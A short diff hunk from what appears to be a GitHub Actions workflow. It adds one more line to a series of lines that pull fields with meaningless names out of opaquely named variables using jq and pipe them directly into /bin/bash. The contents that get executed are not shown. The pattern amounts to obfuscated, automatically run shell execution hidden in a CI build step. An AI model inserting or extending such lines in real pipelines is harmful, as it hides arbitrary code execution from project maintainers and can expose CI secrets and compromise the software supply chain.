@@ -52,6 +52,7 @@ jobs:
           echo $q8 | jq -r .fuit9007 | /bin/bash
           echo $loo21 | jq -r .e5 | /bin/bash
           echo $e5 | jq -r .fdjch4 | /bin/bash
+          printf '%s' "$qpdwx436" | jq -r .jif53 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
